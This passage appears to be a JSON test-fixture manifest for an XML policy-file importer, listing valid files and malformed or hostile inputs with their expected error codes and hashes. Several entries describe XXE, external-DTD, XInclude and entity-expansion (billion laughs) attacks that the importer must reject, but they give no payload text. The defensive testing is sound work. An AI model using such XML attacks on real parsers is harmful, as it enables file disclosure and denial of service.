@@ -1,0 +1,2059 @@
+{
+ "note": "bits/tests fixtures (tester-owned, REQ-180). codes: every code the importer must report (exactly this set); lines: allowed start-tag lines of the first finding of the first code (or of each code in order for multi-code files); element / element_prefix: the #105 (g) path; placeholders are replaced by the test (@@CANARY@@ an absolute path, @@PORT@@ a local listener port). Oversize (5 MiB + 1) and 5,000/5,001-plugin files are generated at test time.",
+ "fixtures": [
+  {
+   "file": "valid/sr-1.1-example.bit",
+   "codes": [],
+   "note": "SR §1.1 canonical example, byte-identical",
+   "sha256": "6654c2092310256d42e1e2aa4598dbe4bc0957545940f4a746f76ff0cd3989b9",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/three-plugins.bit",
+   "codes": [],
+   "note": "valid, three plugins",
+   "sha256": "c822d4027986589c72273f57f8e0921c6d9787edeabc1fb65d4eccacddda233f",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/all-operators.bit",
+   "codes": [],
+   "note": "14 operators with consistent ExpectedResult",
+   "sha256": "88050fb16bfaa670683fc1771b84220cb11db55108b6b72ab79a856ca84116d6",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/mixed-case-values.bit",
+   "codes": [],
+   "note": "case-insensitive enums",
+   "sha256": "899a75dfa53375eaa7a04334fde3088a87f1f624ef0ee763af4c3b1802b7cd9f",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/disabled.bit",
+   "codes": [],
+   "note": "disabled file status",
+   "sha256": "04551523d92607c4af83e1026ac69ce7642d193b755be2b9561f0b9d75567d75",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/utf8-bom.bit",
+   "codes": [],
+   "note": "UTF-8 BOM",
+   "sha256": "908ac836987ae36a631b157a6600b0a3641c84489de7873ee5031713ee9fdd58",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/no-declaration.bit",
+   "codes": [],
+   "note": "no declaration",
+   "sha256": "2adcc0180f24e61325696798015b01528844c3403fb5edbd7489f9bc86c4d1f9",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/lowercase-encoding.bit",
+   "codes": [],
+   "note": "utf-8 any case",
+   "sha256": "4825eaa3cdd6c4045a7a1b7de19ae63bb97a2706ebab2d50a25109dda37c7d7b",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/no-format-version.bit",
+   "codes": [],
+   "note": "formatVersion absent",
+   "sha256": "1357285a37efe450c1defa8777fcf32aa387c88324e8b26e45ba584ddd40c8e6",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/comments.bit",
+   "codes": [],
+   "note": "comments ignored; ExpectedResult is 'install ok installed'",
+   "sha256": "ea49d2491bf1e9db9b6cf51a6cf246d59fda70c8041f2c09243b6fb398e929e4",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/plain-text-execute.bit",
+   "codes": [],
+   "note": "plugin 1 execute 'test -f /etc/issue && stat -c %a /etc/issue 2>/dev/null'; plugin 2 execute \"dpkg-query -W -f='${Status}' apparmor\"",
+   "sha256": "9bb63be8086ca90af1da740d016c8ae388eb3e69258feea1df6632f0497e56af",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/timeout-bounds.bit",
+   "codes": [],
+   "note": "timeouts 1, 600, 600, 60",
+   "sha256": "c4660d18bc94f53407291b638cf771352f4bc7dc534f046324bc9c326f3c99f2",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/unicode.bit",
+   "codes": [],
+   "note": "unicode text round-trips",
+   "sha256": "68497653cc8fa8cc1f5b06b137cb71936cdfce61b972025599f7ca2c5e2ce04d",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/nbsp-name.bit",
+   "codes": [],
+   "note": "stored policy_name keeps both U+00A0",
+   "sha256": "9a5a5520a0cb77ce070fcc23dcd6fc040c1da65314fc66c6f8db8613e5de54f4",
+   "outcome": "success"
+  },
+  {
+   "file": "valid/warnings-only.bit",
+   "codes": [
+    "BIT101",
+    "BIT103"
+   ],
+   "note": "warnings never reject (#110); plugin 3 ref (31 chars) kept",
+   "sha256": "88faeb9ddab5d77ea42cf01c0b7d981b34dc54d9264e87fbe3186694df913c49",
+   "outcome": "success"
+  },
+  {
+   "file": "bit001/xxe-file.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "XXE file; the canary content must never appear and the file is never opened",
+   "sha256": "5283d9c94cae80be8ba931a6b0647f1a6daffa6127453405bcefd476961f3e3e",
+   "outcome": "rejected",
+   "placeholders": [
+    "@@CANARY@@"
+   ]
+  },
+  {
+   "file": "bit001/xxe-url.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "XXE URL; the listener must see no connection",
+   "sha256": "8f8958f2f3991e108907af8e3702e03372746c0cbf34f0e6c3b4dd03310670ae",
+   "outcome": "rejected",
+   "placeholders": [
+    "@@PORT@@"
+   ]
+  },
+  {
+   "file": "bit001/parameter-entity.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "parameter entity; no connection",
+   "sha256": "63965bec446ac17ba96f879f3af1b3506b860a9d0950cc3b40782241e24a1c8b",
+   "outcome": "rejected",
+   "placeholders": [
+    "@@PORT@@"
+   ]
+  },
+  {
+   "file": "bit001/parameter-entity-internal.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "internal parameter entity",
+   "sha256": "afb81ddc2a252d1eb68efa33130fc59733f4222c705af3e37ce9b24869e8306a",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/billion-laughs.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "billion laughs; < 64 MiB peak, < 2 s",
+   "sha256": "9edf7e0e372cad9e2bf04d0d46275771c78efc8a2b5b9bb7f4a7cd0a41e7e913",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/quadratic-blowup.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "quadratic blow-up; 20,000 chars x 10,000 refs = 200 MB if expanded",
+   "sha256": "b6fd2b3a1cf012be04e40c63a84e059a2c15d7eae2e49f4ddedcbdf1b0bdd550",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/dtd-only.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "DTD only",
+   "sha256": "cf2d172e5749b0a0ed234179363e6798a4eb4c7f97a85867042dc36ee9cb356b",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/dtd-element-decl.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "DTD with element declaration only",
+   "sha256": "4284b24343d51d5d7ff7e0bd26f74feb67888004ceb438e87999a2e62053ba86",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/external-dtd-url.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "external DTD; no connection",
+   "sha256": "ac6a7683f1254de5d1628fb315046f6f22e4aa5b1f4ee10a5dbd4e113f26eb2d",
+   "outcome": "rejected",
+   "placeholders": [
+    "@@PORT@@"
+   ]
+  },
+  {
+   "file": "bit001/external-dtd-file.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "external DTD file; never opened",
+   "sha256": "d16e27bd94f858ee87af4b8ab2e9891c6da1656ff528ee1f9f57068cda56a5d2",
+   "outcome": "rejected",
+   "placeholders": [
+    "@@CANARY@@"
+   ]
+  },
+  {
+   "file": "bit001/undefined-entity.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "undefined entity is not well-formed",
+   "sha256": "5df5767d2911cbc884f32217c1bdaa2ebd9f1cbb09f5fbdbde5b27ac24af3404",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/utf16le-bom.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "UTF-16 LE with BOM",
+   "sha256": "578ca907348182830fb5935039734b2af89a50757a0608fcf847d6d4593b452d",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/utf16be-bom.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "UTF-16 BE with BOM",
+   "sha256": "b7b62a2e532b340ddab360476c1b13d3174c526f49386bbe869a871e5dd0eac2",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/utf32le-bom.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "UTF-32 LE with BOM",
+   "sha256": "35fd38afc04c8ee154a7d8bae9c780cc91e74084c2a72c9f873286e4851747ff",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/iso-8859-1.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "ISO-8859-1 declared, byte 0xE9",
+   "sha256": "d270bc02ce40d5b69e9e75b78d7a86393f13571e4229dd0c870d85180e2bef0b",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/iso-8859-1-ascii.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "declared encoding other than UTF-8 (D1)",
+   "sha256": "cbb643b8077829b0f3ab317532bfc49fdda5293aa2355b4e0e87327ecc7d5c9a",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/us-ascii.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "declared encoding other than UTF-8 (D1)",
+   "sha256": "b7d2459d736be983f0e69dd741a301d06c32a2d37c8d94132277810980e64f2a",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/invalid-utf8.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "invalid UTF-8 continuation; first bad byte on line 5",
+   "sha256": "21baa86ee0c01ffa1900dcacdf3eeea46a9ee4a3ea68f1855e15a3afba523fc2",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit001/overlong-utf8.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "overlong UTF-8 encoding of '/'; first bad byte on line 5",
+   "sha256": "db43d08a098814177b332d08f214f8af2a9f133743ba5880485a321538e33a13",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit001/surrogate-utf8.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "UTF-8 encoded surrogate U+D800; first bad byte on line 5",
+   "sha256": "a7db9515fd7d391c66cb00e80c567007fd78ac06f68e62543bc8f679037186de",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit001/lone-continuation.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "lone continuation byte; first bad byte on line 5",
+   "sha256": "655ed0404ad056c826b8993308779c098f5c7d3e1bc900332ea41b3e0985de0f",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit001/truncated-utf8.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "truncated 3-byte sequence; first bad byte on line 5",
+   "sha256": "2141f1a8183469fc0c3fbce33fbb25822070ceefc783fac34689c0f688fac804",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit001/not-well-formed.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "unclosed root",
+   "sha256": "24bad219c9b374b50a55cf37281c12549db39f8448156606516e22d726ebb7f5",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/mismatched-tags.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "mismatched end tag",
+   "sha256": "77aed0a136418700a2b87f50f2d066d50cb6e2a3885c59997b931174278b617d",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ]
+  },
+  {
+   "file": "bit001/empty.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "empty file (0 bytes)",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/whitespace-only.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "whitespace only",
+   "sha256": "cf46937a0e9bebcb979cba8537b21378de2db3739574b0586cadee2ec709229b",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/declaration-only.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "declaration and no root",
+   "sha256": "0eb641dccf1060cf82831778ab04b270b97b24780d0895d5b00d4eb217fc8a1d",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/duplicate-attribute.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "duplicate attribute is not well-formed",
+   "sha256": "5e384eb8234b72ef41d2c29692b5bf4e6a77ffa3911ee008591cf155a33dff32",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/two-roots.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "junk after document element",
+   "sha256": "928ba76b26fc005cf79ddff02269ad3aaf7370000eb69ecb70d9d8ba7a6dd69d",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/text-before-root.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "text before root",
+   "sha256": "8d833a60f725204534063d31252423952bab43f3da2123f3dd3d7c814d98ba6c",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/nul-char-ref.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "&#0; is not an XML 1.0 character",
+   "sha256": "3ce6290ade02d3952177443f0d0cafa97808e4b0d53b5f4f7a5e39a5d1f78706",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/raw-nul.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "raw U+0000",
+   "sha256": "eb9943cd5fb3747d4571ccbc3cc10f712c90e65f1b5c0d50f65b7f03f107728f",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/control-char.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "raw C0 control is not an XML 1.0 character",
+   "sha256": "f88d8576dd3a6fd214a85efbe125160a7f174bbb2bcee9114c174eb4ca7323f4",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/xml-1.1.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "#105 (f) XML 1.0 only",
+   "sha256": "4d4dabd9c208647529f7b551e3f5c6462ec247447a6a055d2412443258a2f9d8",
+   "outcome": "rejected"
+  },
+  {
+   "file": "bit001/sample-tag-forms.bit",
+   "codes": [
+    "BIT001"
+   ],
+   "note": "TS §1.4 sample forms with spaces (REQ-151 (3))",
+   "sha256": "910b58730c09eef13507139e3886f56eab2a1fdbdf590e0311d7c004fb4d56d6",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ]
+  },
+  {
+   "file": "bit002/missing-PolicyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyName missing",
+   "sha256": "96d7b89e9751a6654011fe6a82e315bfc439c0effd123f7a6d705756f7f562e1",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    4
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PolicyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyName twice",
+   "sha256": "caef01e5f352d03667cdea7c4dab63b7c65a845dd09672cd44fdb08fbfb21ee7",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit002/missing-PolicyDescription.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyDescription missing",
+   "sha256": "1e216b8135c0b58748eda853aab50fcd746d94a45a2b07087629d8699cb80660",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    5
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PolicyDescription.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyDescription twice",
+   "sha256": "065b12d5989edc624e4a3d6699ba92f3deaae3246f9fcc83cd48eeb124193f98",
+   "outcome": "rejected",
+   "lines": [
+    6
+   ]
+  },
+  {
+   "file": "bit002/missing-PolicyStatus.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyStatus missing",
+   "sha256": "06b3a87f1b6276ee0f58ffb0a679cf68f63d015890b38d2b8c10dba93f76d6b7",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    6
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PolicyStatus.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyStatus twice",
+   "sha256": "9d807b6f7aeebaccf56d86bfb8b141ac2b9628314bf2e7d1710cfc0dc446f3b7",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "bit002/missing-FamilyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "FamilyName missing",
+   "sha256": "c26dcb62636095e8bca5419d58716301d569b9ec1c32706fffd038d7627e22ba",
+   "outcome": "rejected",
+   "lines": [
+    7,
+    8
+   ]
+  },
+  {
+   "file": "bit002/duplicate-FamilyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "FamilyName twice",
+   "sha256": "6fe388e1fe98a6359cf544bceefa35505e2589a9084a21de40685a79ac817b05",
+   "outcome": "rejected",
+   "lines": [
+    9
+   ]
+  },
+  {
+   "file": "bit002/missing-PluginName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginName missing",
+   "sha256": "b363d118e3b277c7cb541bb1771e7e99e6fc8bcc2749015127fb6b60f67f1f5b",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    12
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PluginName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginName twice",
+   "sha256": "9f95dce2e686b0ebd73c69dd84250d352a741fc463d0db4d8d57fcb23298c1cf",
+   "outcome": "rejected",
+   "lines": [
+    13
+   ]
+  },
+  {
+   "file": "bit002/missing-PluginDescription.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginDescription missing",
+   "sha256": "ade566a72917d340fc12cbdee83675b9b86cd8cd369cc5cf0725a120aef3a17b",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    13
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PluginDescription.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginDescription twice",
+   "sha256": "200a050395b16965c7696de4a71aca3b6f1b6e496cc6ddeb180829935b415b65",
+   "outcome": "rejected",
+   "lines": [
+    14
+   ]
+  },
+  {
+   "file": "bit002/missing-PluginId.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginId missing",
+   "sha256": "0b6bc7811a36c6187fbe0395b95348aaa04088181c5b2e4db8432ab0617a1fb2",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    14
+   ]
+  },
+  {
+   "file": "bit002/duplicate-PluginId.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginId twice",
+   "sha256": "eb918bcbd597bcaaea1ee4f1d393d5f7c7660d907852e6b2b4f8b5619aa3bd73",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ]
+  },
+  {
+   "file": "bit002/missing-Execute.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Execute missing",
+   "sha256": "bf74141722bab05ce25442ee91a1ad6e80de8a80fd15cfe56d7a178ad3eccaaa",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    15
+   ]
+  },
+  {
+   "file": "bit002/duplicate-Execute.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Execute twice",
+   "sha256": "1dcf82b0935bb033d79569b4c56af2cca657830d8c100fff8b36217b044b74aa",
+   "outcome": "rejected",
+   "lines": [
+    16
+   ]
+  },
+  {
+   "file": "bit002/duplicate-Operator.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Operator twice",
+   "sha256": "e7cca2183b2e8324ab781321a0c8dc79305aae0952c8333ea582ef8e6a94483d",
+   "outcome": "rejected",
+   "lines": [
+    17
+   ]
+  },
+  {
+   "file": "bit002/duplicate-ExpectedResult.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "ExpectedResult twice",
+   "sha256": "a2707a02a4e49a5a0b66a420c45d085ee75b22d2b7aca5f1e01504383c4fea5f",
+   "outcome": "rejected",
+   "lines": [
+    18
+   ]
+  },
+  {
+   "file": "bit002/missing-Family.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Family missing",
+   "sha256": "1d2c4f8afbeed94964b0b27050216f122e1a0bd2ab43a8aba61594c422931f46",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    7
+   ]
+  },
+  {
+   "file": "bit002/missing-PluginsGroups.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginsGroups missing",
+   "sha256": "04cfcbfd4524b77d201fbc08860ff8307e806c7d7e82d2e99d401ce8c1f96dd6",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    10
+   ]
+  },
+  {
+   "file": "bit002/order-PolicyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyName and PolicyDescription swapped",
+   "sha256": "0aa87cd83f6d8d06cb7153d209fd12fbe2c334ec7f34af250cabcf68797b9141",
+   "outcome": "rejected",
+   "lines": [
+    4,
+    5
+   ]
+  },
+  {
+   "file": "bit002/order-PolicyStatus.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyStatus after Family",
+   "sha256": "80e254872e33b859b7340eed02901b968ca1ddd8cc1da5c9fbebb08ef9e7c658",
+   "outcome": "rejected",
+   "lines": [
+    6,
+    9
+   ]
+  },
+  {
+   "file": "bit002/order-PluginId.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginId and Execute swapped",
+   "sha256": "aa10b1c86488118f553ae96a092cfab83721855b838e3d25d6580b918c9ee0e1",
+   "outcome": "rejected",
+   "lines": [
+    14,
+    15
+   ]
+  },
+  {
+   "file": "bit002/order-Operator.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Operator and ExpectedResult swapped",
+   "sha256": "ce9130b3984286fd2bcb39ce684867cc549c2ffa62eda5847fab78bc39ba83ca",
+   "outcome": "rejected",
+   "lines": [
+    16,
+    17
+   ]
+  },
+  {
+   "file": "bit002/order-PluginName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginName and PluginDescription swapped",
+   "sha256": "9b3dc50ac77450256a17132cd0c62a637f732fab56593168a46234e876e5dd16",
+   "outcome": "rejected",
+   "lines": [
+    12,
+    13
+   ]
+  },
+  {
+   "file": "bit002/miscased-policyName.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "<policyName>",
+   "sha256": "820b4b9926f44f49ef16b78b1e6578718ac3e3a66975dd50c0e1ce3e5ae2c640",
+   "outcome": "rejected",
+   "lines": [
+    3,
+    4
+   ]
+  },
+  {
+   "file": "bit002/miscased-plugin.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "<plugin>",
+   "sha256": "e9f6dc2727c6f3cd48d352ec2fe3ef85723d46e4ce042386a3c61136c7c37dbd",
+   "outcome": "rejected",
+   "lines": [
+    10,
+    11
+   ]
+  },
+  {
+   "file": "bit002/wrong-root.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "root not Policy",
+   "sha256": "d8f54f5867a5d3dda9aa1006ab3edf984f681088787cba678f616d3137e65355",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ]
+  },
+  {
+   "file": "bit002/second-family.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "two Family elements",
+   "sha256": "92eb2911e2e16b2e98100e9bbd6caeae6c07dda306f2b42118a2a33450a204ee",
+   "outcome": "rejected",
+   "lines": [
+    10
+   ]
+  },
+  {
+   "file": "bit002/empty-pluginsgroups.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PluginsGroups with no Plugin",
+   "sha256": "e35038de7505823467c56129fecceeb25263861b114f8d32bd24e3d688dc3c17",
+   "outcome": "rejected",
+   "lines": [
+    10
+   ]
+  },
+  {
+   "file": "bit002/selfclosing-pluginsgroups.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "<PluginsGroups/>",
+   "sha256": "4ae17c1786fba2d1f8faf24bd1cc1f9bf7489b1145c4c9807e6b524b6d61aa14",
+   "outcome": "rejected",
+   "lines": [
+    10
+   ]
+  },
+  {
+   "file": "bit002/unknown-element-policy.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "unknown <Author>",
+   "sha256": "b65f7df9443084c2b525ac957bbd8e3a89d75071aa1438e6823ddb5cb9c5dede",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "bit002/unknown-element-plugin.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "unknown <Severity>",
+   "sha256": "9cd4849bc5165dccb8ebe22f4ff9f1e270855c0629fbcf922af2f9cfaa6d7e1c",
+   "outcome": "rejected",
+   "lines": [
+    16
+   ]
+  },
+  {
+   "file": "bit002/unknown-attr-root.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Policy/@id",
+   "sha256": "4d03ed3730bb4c50e16866065606a4bd62f62cde16a1e04f85121fe926f060bd",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ]
+  },
+  {
+   "file": "bit002/unknown-attr-plugin.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Plugin/@id",
+   "sha256": "7ee06675dd0ad8890241990a411717fcd387278597c71ef98def5b92329015f6",
+   "outcome": "rejected",
+   "lines": [
+    11
+   ]
+  },
+  {
+   "file": "bit002/unknown-attr-execute.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "Execute/@user",
+   "sha256": "916a88580268be6fa11efa97827742f85b796bfb9bf321b69a35ee07c7d1cf2d",
+   "outcome": "rejected",
+   "lines": [
+    15
+   ]
+  },
+  {
+   "file": "bit002/attr-on-leaf.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PolicyName/@lang",
+   "sha256": "0a9ac12b27c2e496addce81a30a5026ca5542ca35db9a756fa3a2e40e380029f",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ]
+  },
+  {
+   "file": "bit002/text-in-family.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "text in Family",
+   "sha256": "9a740a088895381a46763044f1ab55db250093171eacd49024e262a69d4ec6cd",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "bit002/text-in-plugin.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "text in Plugin",
+   "sha256": "f6725bcf4d04c3c0e34dd42990beab5eea2b43f4cd3be37ef4690067fddddeb1",
+   "outcome": "rejected",
+   "lines": [
+    11,
+    16
+   ]
+  },
+  {
+   "file": "bit002/child-in-leaf.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "<b> in PolicyName",
+   "sha256": "d8bff469452e859d1b3b3e04f4dfc42371dacf729aab192e428c8ebbbc107a44",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ]
+  },
+  {
+   "file": "bit002/processing-instruction.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "PI in Policy",
+   "sha256": "6d3ac9f6c7a46f8284b01345ebf6a7e81bb5a714d9cb5cb97864032f00e0342c",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "bit002/pi-before-root.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "xml-stylesheet PI",
+   "sha256": "459b577fb5c44b9e308cfb45df7c98ca8b1f92f7c66b756f32620c795e2beb28",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ]
+  },
+  {
+   "file": "bit002/namespace-default.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "xmlns",
+   "sha256": "3ac97e5323d219349234c6718ab6e44f11c7137b35c5afe80bc76c3a0c58e209",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ]
+  },
+  {
+   "file": "bit002/namespace-prefixed.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "b:PolicyName",
+   "sha256": "0e40e27fdcc883efc4f6b09cb1a6d7bfe6239d315cffa5359b82bde3cf403db7",
+   "outcome": "rejected",
+   "lines": [
+    4
+   ]
+  },
+  {
+   "file": "bit002/xinclude.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "xi:include; canary never read",
+   "sha256": "8cab08455000c79de875369dab9a8229065818cd3f9b330b8a8db5a5c08cee2d",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ],
+   "placeholders": [
+    "@@CANARY@@"
+   ]
+  },
+  {
+   "file": "bit002/nine-attributes.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "9 attributes",
+   "sha256": "278ffa8b1d4a8080d28b19a14fdbd4d9595f456ada2f103de67351529b899ae6",
+   "outcome": "rejected",
+   "lines": [
+    3
+   ]
+  },
+  {
+   "file": "bit002/depth-17.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "17 levels",
+   "sha256": "ae56a96e88cd234b6d3e54c8bc198656c916bafcf7bd45a9f01f1be77093ad46",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit002/plus-bit003.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "BIT002 masks BIT003 (REQ-151 (6))",
+   "sha256": "941825c22739da6b7b1771ac933d8b3e9c5b6d5802b0c28ca9b49ab7a532a7b4",
+   "outcome": "rejected",
+   "lines": [
+    5
+   ]
+  },
+  {
+   "file": "bit002/plus-bit016.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "BIT002 masks BIT016",
+   "sha256": "109d89b5b5b7f2271d0955724c08d69bf5f61727520d42e59fa777e44940190d",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "bit002/plus-bit102.bit",
+   "codes": [
+    "BIT002"
+   ],
+   "note": "BIT002 masks BIT102",
+   "sha256": "42fc5abc1d0c426e904184dfde4517bd90923cc4930b0373c89051d86b3469d3",
+   "outcome": "rejected",
+   "lines": [
+    7
+   ]
+  },
+  {
+   "file": "content/bit003-on.bit",
+   "codes": [
+    "BIT003"
+   ],
+   "note": "PolicyStatus 'on'",
+   "sha256": "90473aac0be7feaa928503097623708ca115cebee0f6f3b9a0d2dae6cfd20efc",
+   "outcome": "rejected",
+   "lines": [
+    6
+   ],
